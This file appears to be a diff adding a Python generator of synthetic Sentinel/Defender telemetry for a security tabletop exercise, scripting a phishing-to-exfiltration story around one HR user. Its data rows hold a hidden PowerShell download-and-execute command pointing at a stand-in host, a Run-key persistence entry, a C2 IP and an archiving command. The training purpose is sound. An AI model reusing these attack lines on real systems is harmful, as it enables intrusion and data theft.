@@ -1,0 +1,208 @@
+"""Build deterministic Kusto CSV batches for the Storm-2077 tabletop.
+
+Files are headerless because Kusto ingests them positionally. ``manifest.json``
+contains the schema and release offset for every batch.
+"""
+
+from __future__ import annotations
+
+import argparse
+import csv
+import hashlib
+import json
+import random
+from collections import defaultdict
+from datetime import datetime, timedelta, timezone
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent
+SCHEMA_DIR = ROOT / "schema"
+TENANT = "8cafe100-0000-4000-9000-000000000001"
+DAY = datetime(2026, 11, 12, 10, 0, tzinfo=timezone.utc)
+LOUISE = "louise.lonn@creditsafe.com"
+DEVICE = "CS-LL-W11-042"
+C2 = "209.141.46.83"
+RNG = random.Random(2077)
+
+ROLE_PROFILES = {
+    "auditor": ["Compliance Reader"],
+    "cloud_admin": ["Azure Contributor"],
+    "grc": ["Compliance Reader"],
+    "m365_admin": ["Exchange Administrator", "SharePoint Administrator"],
+    "network_admin": ["Network Contributor"],
+    "privileged_engineer": ["Intune Administrator"],
+    "security_analyst": ["Security Reader", "Microsoft Sentinel Responder"],
+    "grc_auditor": ["Compliance Reader", "eDiscovery Reviewer"],
+    "service_desk": ["Authentication Administrator", "User Administrator"],
+    "cloud_architect": ["Azure Reader"],
+}
+
+
+def stamp(value):
+    return value.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")
+
+
+def load_schemas():
+    schemas = {}
+    for path in sorted(SCHEMA_DIR.glob("*.csv")):
+        with path.open(encoding="utf-8-sig", newline="") as handle:
+            rows = sorted(csv.DictReader(handle), key=lambda item: int(item["ColumnOrdinal"]))
+        schemas[path.stem] = [{"name": item["ColumnName"], "type": item["ColumnType"]} for item in rows]
+    return schemas
+
+
+def record(schemas, table, **values):
+    allowed = {column["name"] for column in schemas[table]}
+    unknown = set(values) - allowed
+    if unknown:
+        raise ValueError(f"{table} has no columns: {sorted(unknown)}")
+    base = {"TenantId": TENANT, "SourceSystem": "Tabletop", "Type": table}
+    base.update(values)
+    return {column["name"]: base.get(column["name"], "") for column in schemas[table]}
+
+
+def add(rows, offset, table, item):
+    rows[(offset, table)].append(item)
+
+
+def build_rows(schemas):
+    rows = defaultdict(list)
+    historical = -1
+    september = datetime(2026, 9, 3, 9, 8, tzinfo=timezone.utc)
+
+    add(rows, historical, "IdentityInfo", record(schemas, "IdentityInfo", TimeGenerated=stamp(DAY-timedelta(days=1)), AccountName="louise.lonn", AccountDomain="creditsafe.com", AccountUPN=LOUISE, AccountDisplayName="Louise Lonn", Department="Human Resources", JobTitle="HR Analyst", AssignedRoles=json.dumps(["eDiscovery Manager", "Security Reader"]), GroupMembership=json.dumps(["Human Resources"]), IsAccountEnabled="true", UserType="Member", RiskLevel="high", IsMFARegistered="true"))
+    add(rows, historical, "DeviceInfo", record(schemas, "DeviceInfo", TimeGenerated=stamp(DAY-timedelta(days=1)), Timestamp=stamp(DAY-timedelta(days=1)), DeviceId="dev-ll-042", DeviceName=DEVICE, OSPlatform="Windows11", OnboardingStatus="Onboarded", SensorHealthState="Active", IsAzureADJoined="true", MachineGroup="Corporate Workstations"))
+
+    with (ROOT / "SCENARIO_ROSTER.csv").open(encoding="utf-8-sig", newline="") as handle:
+        roster = list(csv.DictReader(handle))
+    for index, user in enumerate(roster):
+        upn=user["UserPrincipalName"]
+        roles = ["eDiscovery Manager", "Security Reader"] if upn == LOUISE else ROLE_PROFILES.get(user["SimulationProfile"], [])
+        if upn != LOUISE:
+            add(rows,historical,"IdentityInfo",record(schemas,"IdentityInfo",TimeGenerated=stamp(DAY-timedelta(days=1)),AccountName=upn.split("@")[0],AccountDomain=upn.split("@")[-1],AccountUPN=upn,AccountDisplayName=user["DisplayName"],Department=user["Department"],JobTitle=user["JobTitle"],AssignedRoles=json.dumps(roles),GroupMembership=json.dumps([user["Department"]]),IsAccountEnabled="true",UserType=user["UserType"],RiskLevel="none",IsMFARegistered="true"))
+        if user["UserType"] != "Member":
+            continue
+        device=f"CS-{user['UserId']}-W11"
+        add(rows,historical,"DeviceInfo",record(schemas,"DeviceInfo",TimeGenerated=stamp(DAY-timedelta(days=1)),Timestamp=stamp(DAY-timedelta(days=1)),DeviceId=f"dev-{user['UserId'].lower()}",DeviceName=device,OSPlatform="Windows11",OnboardingStatus="Onboarded",SensorHealthState="Active",IsAzureADJoined="true",MachineGroup="Corporate Workstations"))
+        for event_number in range(24):
+            days_ago=2+((index*7+event_number*11)%87); minute=(index*13+event_number*37)%540+480; when=DAY-timedelta(days=days_ago)+timedelta(minutes=minute)
+            add(rows,historical,"SigninLogs",record(schemas,"SigninLogs",TimeGenerated=stamp(when),UserPrincipalName=upn,UserDisplayName=user["DisplayName"],AppDisplayName=("Microsoft Teams","Office 365 Exchange Online","Microsoft SharePoint Online")[event_number%3],IPAddress=f"10.{20+index%20}.{event_number%250}.{10+index%200}",ResultType="0",ResultDescription="Success",ClientAppUsed="Browser",DeviceDetail=json.dumps({"deviceId":f"dev-{user['UserId'].lower()}","displayName":device,"isManaged":True}),Location="GB",LocationDetails=json.dumps({"city":("London","Cardiff","Bristol","Manchester")[index%4],"countryOrRegion":"GB"}),RiskLevelDuringSignIn="none"))
+        for event_number in range(10):
+            days_ago=1+((index*5+event_number*9)%88); when=DAY-timedelta(days=days_ago)+timedelta(hours=8+(event_number%9),minutes=index%55); filename=f"Project_{(index+event_number)%40:02}_Document_{event_number:02}.docx"
+            add(rows,historical,"CloudAppEvents",record(schemas,"CloudAppEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=upn,AccountDisplayName=user["DisplayName"],Application="Microsoft SharePoint Online",ActionType=("FileAccessed","FilePreviewed","FileDownloaded")[event_number%3],ObjectName=filename,ObjectType="File",IPAddress=f"10.{20+index%20}.4.{10+index%200}",CountryCode="GB",IsExternalUser="false",OSPlatform="Windows 11",DeviceType="Desktop"))
+        for event_number in range(3):
+            days_ago=3+((index*3+event_number*17)%84); when=DAY-timedelta(days=days_ago)+timedelta(hours=9+event_number)
+            recipient=roster[(index+event_number+1)%len(roster)]["UserPrincipalName"]
+            add(rows,historical,"EmailEvents",record(schemas,"EmailEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),NetworkMessageId=f"normal-{index:03}-{event_number}",SenderFromAddress=upn,SenderFromDomain="creditsafe.com",RecipientEmailAddress=recipient,Subject=("Project update","Meeting notes","Monthly report")[event_number],DeliveryAction="Delivered",DeliveryLocation="Inbox",EmailDirection="Intra-org",ThreatTypes="",UrlCount="0"))
+
+    message_id = "msg-hr-clickfix-0903"
+    add(rows, historical, "EmailEvents", record(schemas, "EmailEvents", TimeGenerated=stamp(september), Timestamp=stamp(september), NetworkMessageId=message_id, SenderFromAddress="benefits@hr-document.example", SenderFromDomain="hr-document.example", RecipientEmailAddress=LOUISE, Subject="Updated employee benefits document", DeliveryAction="Delivered", DeliveryLocation="Inbox", EmailDirection="Inbound", ThreatTypes="Phish", UrlCount="1"))
+    add(rows, historical, "EmailEvents", record(schemas, "EmailEvents", TimeGenerated=stamp(september), Timestamp=stamp(september), NetworkMessageId=message_id+"-shared", SenderFromAddress="benefits@hr-document.example", RecipientEmailAddress="hr@creditsafe.com", Subject="Updated employee benefits document", DeliveryAction="Delivered", DeliveryLocation="Inbox", EmailDirection="Inbound", ThreatTypes="Phish", UrlCount="1"))
+    add(rows, historical, "UrlClickEvents", record(schemas, "UrlClickEvents", Timestamp=stamp(september+timedelta(minutes=2)), TimeGenerated=stamp(september+timedelta(minutes=2)), Url="https://microsoft-document.example/verify", ActionType="ClickAllowed", AccountUpn=LOUISE, Workload="Email", NetworkMessageId=message_id, IPAddress="10.42.18.73", IsClickedThrough="true"))
+    add(rows, historical, "SigninLogs", record(schemas, "SigninLogs", TimeGenerated=stamp(september+timedelta(minutes=3)), UserPrincipalName=LOUISE, UserDisplayName="Louise Lonn", AppDisplayName="Office 365 Exchange Online", IPAddress="192.0.2.85", ResultType="0", ResultDescription="Success", ClientAppUsed="Browser", DeviceDetail=json.dumps({"deviceId":"","isManaged":False}), SessionId="sess-clickfix-0903", Location="GB", RiskLevelDuringSignIn="medium"))
+    add(rows, historical, "DeviceProcessEvents", record(schemas, "DeviceProcessEvents", TimeGenerated=stamp(september+timedelta(minutes=4)), Timestamp=stamp(september+timedelta(minutes=4)), DeviceId="dev-ll-042", DeviceName=DEVICE, AccountUpn=LOUISE, ActionType="ProcessCreated", FileName="powershell.exe", FolderPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0", ProcessCommandLine="powershell -w hidden -c iwr https://cdn-update.example/a.ps1 | iex", InitiatingProcessFileName="msedge.exe", InitiatingProcessAccountUpn=LOUISE))
+    add(rows, historical, "DeviceProcessEvents", record(schemas, "DeviceProcessEvents", TimeGenerated=stamp(september+timedelta(minutes=5)), Timestamp=stamp(september+timedelta(minutes=5)), DeviceId="dev-ll-042", DeviceName=DEVICE, AccountUpn=LOUISE, ActionType="ProcessCreated", FileName="svchost-update.exe", FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Roaming\\Microsoft", ProcessCommandLine="svchost-update.exe -silent", InitiatingProcessFileName="powershell.exe", SHA256=hashlib.sha256(b"sparkrat-tabletop").hexdigest()))
+    for day in range(0, 70, 3):
+        when = september + timedelta(days=day, minutes=6)
+        add(rows, historical, "DeviceNetworkEvents", record(schemas, "DeviceNetworkEvents", TimeGenerated=stamp(when), Timestamp=stamp(when), DeviceId="dev-ll-042", DeviceName=DEVICE, ActionType="ConnectionSuccess", RemoteIP=C2, RemotePort="443", RemoteUrl="aeifile.offiec.us.kg", Protocol="Tcp", InitiatingProcessFileName="svchost-update.exe", InitiatingProcessAccountUpn=LOUISE))
+    add(rows, historical, "ThreatIntelligenceIndicator", record(schemas, "ThreatIntelligenceIndicator", TimeGenerated=stamp(DAY-timedelta(days=20)), Action="Alert", Active="true", ConfidenceScore="85", Description="Historical TAG-100 command-and-control infrastructure; Microsoft maps TAG-100 to Storm-2077", ExternalIndicatorId="TI-TAG100-2091414683", ThreatType="Command and control", ThreatSeverity="High", NetworkIP=C2, IndicatorProvider="Recorded Future", Tags=json.dumps(["TAG-100", "Storm-2077"])))
+
+    audit_events = [
+        (19, "Reset user password", LOUISE, "Anita Job", "Success"),
+        (3*24*60+117, "Invite external user", "hradvisor@rnicrosoft.com", LOUISE, "Success"),
+        (16*24*60+272, "Add member to role", LOUISE, "eDiscovery Manager", "Success"),
+        (16*24*60+273, "Add member to role", LOUISE, "Security Reader", "Success"),
+    ]
+    for minutes, operation, target, actor, result in audit_events:
+        when=september+timedelta(minutes=minutes)
+        add(rows, historical, "AuditLogs", record(schemas, "AuditLogs", TimeGenerated=stamp(when), OperationName=operation, ActivityDisplayName=operation, Result=result, Identity=actor, InitiatedBy=json.dumps({"user":{"userPrincipalName":actor}}), TargetResources=json.dumps([{"displayName":target}]), Category="UserManagement"))
+
+    for group, count in enumerate([50,49,49,49,49]):
+        start=datetime(2026,9,28,10,0,tzinfo=timezone.utc)+timedelta(days=group*6)
+        for number in range(1,count+1):
+            when=start+timedelta(seconds=50*number)
+            filename=f"Personal_{group+1}_{number:02}.docx"
+            add(rows,historical,"CloudAppEvents",record(schemas,"CloudAppEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft OneDrive for Business",ActionType="FileDownloaded",ObjectName=filename,ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN"))
+            add(rows,historical,"OfficeActivity",record(schemas,"OfficeActivity",TimeGenerated=stamp(when),Operation="FileDownloaded",Activity="FileDownloaded",UserId=LOUISE,OfficeWorkload="SharePoint",ClientIP="203.0.113.44",SourceFileName=filename,ResultStatus="Succeeded"))
+
+    for attempt in range(9):
+        when=datetime(2026,9,1,8,0,tzinfo=timezone.utc)+timedelta(days=attempt*8)
+        add(rows,historical,"CiscoASA_CL",record(schemas,"CiscoASA_CL",TimeGenerated=stamp(when),DeviceName="CS-EDGE-ASA-01",DeviceVendor="Cisco",DeviceProduct="ASA",DeviceVersion="9.18(4)",EventType="Intrusion",EventSubType="ExploitAttempt",Severity="High",Action="Blocked",Result="Failure",Direction="Inbound",Protocol="TCP",SourceIP=C2,DestinationIP="198.51.100.10",DestinationPort="443",SignatureId="CVE-2020-3452",ThreatName="Path traversal attempt",BytesSent="312",BytesReceived="0"))
+
+    historical_incidents = [
+        ("INC-1841", "Phishing link reported by Louise Lonn", september+timedelta(minutes=26), "Medium", "Initial Access", "Password reset completed. User confirmed the message was reported."),
+        ("INC-1854", "Impossible travel - Birmingham", datetime(2026,9,4,14,46,tzinfo=timezone.utc), "Medium", "Initial Access", "ExpressVPN activity considered expected."),
+        ("INC-1868", "Guest account invited to tenant", datetime(2026,9,6,11,31,tzinfo=timezone.utc), "Medium", "Persistence", "Microsoft adviser account; no further action required."),
+        ("INC-1889", "Impossible travel - China", datetime(2026,9,11,2,42,tzinfo=timezone.utc), "High", "Initial Access", "ExpressVPN use explains location."),
+        ("INC-1932", "Louise Lonn downloaded 50 personal files", datetime(2026,9,28,11,6,tzinfo=timezone.utc), "High", "Collection", "Filenames appear personal. Closed as user activity."),
+    ]
+    for incident_id,title,closed,severity,tactics,comment in historical_incidents:
+        alert_id=f"ALT-{incident_id[4:]}"
+        add(rows,historical,"SecurityAlert",record(schemas,"SecurityAlert",TimeGenerated=stamp(closed-timedelta(minutes=20)),DisplayName=title,AlertName=title,AlertSeverity=severity,Description="Historical detection reviewed by SecOps.",ProviderName="Microsoft Defender XDR",VendorName="Microsoft",SystemAlertId=alert_id,IsIncident="true",StartTime=stamp(closed-timedelta(minutes=25)),EndTime=stamp(closed-timedelta(minutes=20)),Status="Resolved",CompromisedEntity=LOUISE,Tactics=tactics))
+        add(rows,historical,"SecurityIncident",record(schemas,"SecurityIncident",TimeGenerated=stamp(closed),IncidentName=incident_id,Title=title,Description="Historical incident retained for retrospective investigation.",Severity=severity,Status="Closed",Classification="BenignPositive",ClassificationReason="SuspiciousButExpected",ClassificationComment=comment,Owner=json.dumps({"assignedTo":"Anita Job"}),ProviderName="Microsoft Sentinel",ProviderIncidentId=incident_id,CreatedTime=stamp(closed-timedelta(minutes=30)),ClosedTime=stamp(closed),IncidentNumber=incident_id[4:],AlertIds=json.dumps([alert_id]),ModifiedBy="Anita Job"))
+
+    alert_catalog = [
+        (5,"INC-2001","Admin user deleted an MFA phone from a user's account","Medium","Credential Access"),(10,"INC-2002","Email messages containing malicious URL deleted after delivery","Medium","Initial Access"),(20,"INC-2003","MFA rejected by user","Medium","Credential Access"),(30,"INC-2004","Rare and potentially high-risk Office operations","High","Persistence, Collection"),(40,"INC-2005","Azure VM Run Command executing a unique PowerShell script","Medium","Execution"),(50,"INC-2006","Outbound email exceeds 400","Medium","Exfiltration"),(57,"INC-2007","Files copied to USB - blocked by policy","Low","Exfiltration"),(65,"INC-2008","Guest users invited to tenant by new inviters","Medium","Persistence"),(85,"INC-2009","Louise Lonn downloaded 50 files","High","Collection"),(100,"INC-2010","Archive created in a suspicious temporary location","High","Collection, Exfiltration"),(110,"INC-2011","Account created and deleted in a short timeframe","Medium","Persistence"),(120,"INC-2012","Sensitive file upload to external Teams user blocked","Medium","Exfiltration"),(135,"INC-2013","User added to Intune_Local_Admins Entra ID group","High","Privilege Escalation"),(150,"INC-2014","External guest downloaded sensitive archives","High","Collection, Exfiltration"),(170,"INC-2015","Connection to a custom network indicator","Medium","Command and Control"),(190,"INC-2016","Registry-based persistence references SparkRAT","High","Persistence"),
+    ]
+    for minute,incident_id,title,severity,tactics in alert_catalog:
+        when=DAY+timedelta(minutes=minute); alert_id=f"ALT-{incident_id[4:]}"
+        add(rows,minute*60,"SecurityAlert",record(schemas,"SecurityAlert",TimeGenerated=stamp(when),DisplayName=title,AlertName=title,AlertSeverity=severity,Description="Review the related entities and source telemetry.",ProviderName="Microsoft Defender XDR",VendorName="Microsoft",SystemAlertId=alert_id,IsIncident="true",StartTime=stamp(when-timedelta(minutes=5)),EndTime=stamp(when),Status="New",Tactics=tactics))
+        add(rows,minute*60,"SecurityIncident",record(schemas,"SecurityIncident",TimeGenerated=stamp(when),IncidentName=incident_id,Title=title,Description="Automatically created from the scheduled analytic alert.",Severity=severity,Status="New",Owner=json.dumps({"assignedTo":None}),ProviderName="Microsoft Sentinel",ProviderIncidentId=incident_id,CreatedTime=stamp(when),IncidentNumber=incident_id[4:],AlertIds=json.dumps([alert_id])))
+        add(rows,minute*60,"AlertEvidence",record(schemas,"AlertEvidence",TimeGenerated=stamp(when),Timestamp=stamp(when),AlertId=alert_id,Title=title,Categories=tactics,ServiceSource="Microsoft Sentinel",DetectionSource="Scheduled analytics",EntityType="Account",EvidenceRole="Impacted",AccountUpn=LOUISE if incident_id in {"INC-2004","INC-2009","INC-2010","INC-2014","INC-2016"} else "",Severity=severity))
+
+    day_events = [
+        (1,"AuditLogs",dict(OperationName="Delete user authentication phone method",ActivityDisplayName="Delete user authentication phone method",Identity="adam.thomas@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Victoria Nash"}]))),
+        (8,"EmailEvents",dict(NetworkMessageId="rh-campaign-001",SenderFromAddress="offers@campaign-example.test",SenderFromDomain="campaign-example.test",RecipientEmailAddress="ruby.lawson@creditsafe.com",Subject="Urgent campaign document",DeliveryAction="Blocked",DeliveryLocation="Quarantine",LatestDeliveryAction="ZAP",ThreatTypes="Phish",UrlCount="1")),
+        (16,"SigninLogs",dict(UserPrincipalName="molly.ups@creditsafe.com",UserDisplayName="Molly Ups",AppDisplayName="Microsoft Office",IPAddress="10.24.8.31",ResultType="500121",ResultDescription="Authentication failed because the user declined the MFA request",ClientAppUsed="Mobile Apps and Desktop clients",DeviceDetail=json.dumps({"displayName":"Molly managed iPhone","isManaged":True}),Location="GB",RiskLevelDuringSignIn="low")),
+        (25,"OfficeActivity",dict(Operation="New-InboxRule",Activity="New-InboxRule",UserId=LOUISE,OfficeWorkload="Exchange",ClientIP="203.0.113.44",Parameters=json.dumps({"Name":"Personal","ForwardTo":"craiglonn@gmail.com"}),ResultStatus="Succeeded")),
+        (34,"AzureActivity",dict(OperationName="Run Command on Virtual Machine",OperationNameValue="Microsoft.Compute/virtualMachines/runCommand/action",ActivityStatus="Succeeded",ActivityStatusValue="Success",ResourceGroup="production-monitoring-rg",Caller="david.woofer@creditsafe.com",CallerIpAddress="10.22.14.8",Category="Administrative",CategoryValue="Administrative",Resource="az-monitor-17")),
+        (35,"OfficeActivity",dict(Operation="SearchQueryInitiatedExchange",Activity="Search",UserId=LOUISE,OfficeWorkload="Exchange",ClientIP="203.0.113.44",Parameters=json.dumps({"Query":"payroll salary redundancy disciplinary PII"}),ResultStatus="Succeeded")),
+        (45,"OfficeActivity",dict(Operation="SearchStarted",Activity="eDiscoverySearch",UserId=LOUISE,OfficeWorkload="SecurityComplianceCenter",ClientIP="203.0.113.44",Parameters=json.dumps({"Case":"HR-Confidential","Query":"payroll OR salary OR redundancy"}),ResultStatus="Succeeded")),
+        (52,"CloudAppEvents",dict(AccountId="aimee.flangan@creditsafe.com",AccountDisplayName="Aimee Flangan",Application="Microsoft Defender for Endpoint",ActionType="FileCopiedToRemovableMediaBlocked",ObjectName="Project_Delivery_Pack.zip",ObjectType="File",IPAddress="10.25.7.19",AdditionalFields=json.dumps({"device":"CS-PMO-W11-014","usbSerial":"CS-USB-0042","result":"Blocked"}))),
+        (58,"AuditLogs",dict(OperationName="Invite external user",ActivityDisplayName="Invite external user",Identity="beth.edgar@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Ayeesha Ahmed","userPrincipalName":"ayeesha.ahmed@external.example"}]))),
+        (90,"DeviceFileEvents",dict(ActionType="FileCreated",DeviceId="dev-ll-042",DeviceName=DEVICE,FileName="eDiscoveryExport001.pst",FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Local\\Temp",InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="msedge.exe",SensitivityLabel="Highly Confidential")),
+        (95,"DeviceProcessEvents",dict(DeviceId="dev-ll-042",DeviceName=DEVICE,AccountUpn=LOUISE,ActionType="ProcessCreated",FileName="7z.exe",ProcessCommandLine='7z a "%TEMP%\\hr_personal.7z" "%TEMP%\\eDiscoveryExport*"',InitiatingProcessFileName="svchost-update.exe")),
+        (104,"AuditLogs",dict(OperationName="Delete user",ActivityDisplayName="Delete user",Identity="emma.outgram@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"M365-MIG-VALIDATE-07"}]),ResultReason="Approved migration validation change")),
+        (114,"CloudAppEvents",dict(AccountId="hannah.rees@creditsafe.com",AccountDisplayName="Hannah Rees",Application="Microsoft Teams",ActionType="FileUploadBlocked",ObjectName="External_PenTest_Findings_Sanitised.pdf",ObjectType="File",IsExternalUser="false",AdditionalFields=json.dumps({"recipient":"Tom Blackburn","result":"Blocked","policy":"External sharing DLP"}))),
+        (125,"CloudAppEvents",dict(AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft SharePoint Online",ActionType="FileUploaded",ObjectName="hr_personal.7z",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN",IsExternalUser="false")),
+        (129,"AuditLogs",dict(OperationName="Add member to group",ActivityDisplayName="Add member to group",Identity="barry.thendrews@creditsafe.com",Result="Success",TargetResources=json.dumps([{"displayName":"Bill Cottray"},{"displayName":"Intune_Local_Admins"}]))),
+        (135,"OfficeActivity",dict(Operation="SharingSet",Activity="SharingSet",UserId=LOUISE,OfficeWorkload="SharePoint",ClientIP="203.0.113.44",SourceFileName="hr_personal.7z",UserSharedWith="hradvisor@rnicrosoft.com",SharingType="ExternalUserSharingOnly",ResultStatus="Succeeded",ExternalAccess="true")),
+        (145,"CloudAppEvents",dict(AccountId="hradvisor@rnicrosoft.com",AccountDisplayName="HR Advisor",Application="Microsoft SharePoint Online",ActionType="FileDownloaded",ObjectName="hr_personal.7z",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN",IsExternalUser="true")),
+        (155,"CloudAppEvents",dict(AccountId=LOUISE,Application="Microsoft OneDrive",ActionType="FileSyncBlocked",ObjectName="hr_personal.7z",AdditionalFields=json.dumps({"destination":"craiglonn personal OneDrive","policy":"External cloud storage block"}))),
+        (165,"DeviceNetworkEvents",dict(DeviceId="dev-net-adm-017",DeviceName="NET-ADM-017",ActionType="ConnectionSuccess",RemoteIP="198.51.100.200",RemotePort="443",RemoteUrl="indicator-validation.example",Protocol="Tcp",InitiatingProcessFileName="indicator-test.exe",InitiatingProcessAccountUpn="damo.tom@creditsafe.com")),
+        (190,"DeviceRegistryEvents",dict(ActionType="RegistryValueSet",DeviceId="dev-ll-042",DeviceName=DEVICE,InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="svchost-update.exe",RegistryKey="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",RegistryValueName="OneDrive Update",RegistryValueData="C:\\Users\\Louise.Lonn\\AppData\\Roaming\\Microsoft\\svchost-update.exe")),
+        (200,"DeviceFileEvents",dict(ActionType="FileDeleted",DeviceId="dev-ll-042",DeviceName=DEVICE,FileName="hr_personal.7z",FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Local\\Temp",InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="svchost-update.exe")),
+    ]
+    for minute, table, values in day_events:
+        values.setdefault("TimeGenerated",stamp(DAY+timedelta(minutes=minute)))
+        if "Timestamp" in {c["name"] for c in schemas[table]}: values.setdefault("Timestamp",stamp(DAY+timedelta(minutes=minute)))
+        add(rows,minute*60,table,record(schemas,table,**values))
+
+    for number in range(1,51):
+        minute=35+(45*number/50)
+        when=DAY+timedelta(minutes=minute)
+        values=dict(TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft SharePoint Online",ActionType="FileDownloaded",ObjectName=f"HR_Employee_{number:03}.docx",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN")
+        add(rows,int(minute*60),"CloudAppEvents",record(schemas,"CloudAppEvents",**values))
+    for number in range(427):
+        when=DAY+timedelta(minutes=5,seconds=number*5)
+        add(rows,45*60,"EmailEvents",record(schemas,"EmailEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),NetworkMessageId=f"sales-campaign-{number:04}",SenderFromAddress="olivia.mercer@creditsafe.com",SenderFromDomain="creditsafe.com",RecipientEmailAddress=f"prospect{number:04}@customer.example",Subject="Creditsafe customer update",DeliveryAction="Delivered",DeliveryLocation="Inbox",EmailDirection="Outbound",Connectors="Dynamics 365 Sales",ThreatTypes="",UrlCount="1"))
+    for second in range(160*60,190*60,10):
+        when=DAY+timedelta(seconds=second)
+        add(rows,second,"DeviceNetworkEvents",record(schemas,"DeviceNetworkEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),DeviceId="dev-ll-042",DeviceName=DEVICE,ActionType="ConnectionSuccess",RemoteIP=C2,RemotePort="443",RemoteUrl="aeifile.offiec.us.kg",Protocol="Tcp",InitiatingProcessFileName="svchost-update.exe",InitiatingProcessAccountUpn=LOUISE))
+    return rows
+
+
+def write_build(output):
+    schemas=load_schemas(); batches=build_rows(schemas); output.mkdir(parents=True,exist_ok=True); manifest={"version":1,"database":"TabletopSIEM","schemas":schemas,"batches":[]}
+    for (offset,table),items in sorted(batches.items()):
+        folder=output/("historical" if offset<0 else f"scheduled/t{offset:05}"); folder.mkdir(parents=True,exist_ok=True); path=folder/f"{table}.csv"; columns=[c["name"] for c in schemas[table]]
+        with path.open("w",encoding="utf-8",newline="") as handle:
+            writer=csv.DictWriter(handle,fieldnames=columns,extrasaction="raise",lineterminator="\n"); writer.writerows(items)
+        batch_id=hashlib.sha256(f"{offset}:{table}:{len(items)}".encode()).hexdigest()[:16]
+        manifest["batches"].append({"id":batch_id,"offset_seconds":offset,"table":table,"rows":len(items),"path":path.relative_to(output).as_posix()})
+    (output/"manifest.json").write_text(json.dumps(manifest,indent=2),encoding="utf-8")
+    return manifest
+
+
+if __name__=="__main__":
+    parser=argparse.ArgumentParser(); parser.add_argument("--output",type=Path,default=ROOT/"generated"); args=parser.parse_args(); built=write_build(args.output.resolve()); print(f"Built {sum(b['rows'] for b in built['batches'])} rows in {len(built['batches'])} batches at {args.output.resolve()}")
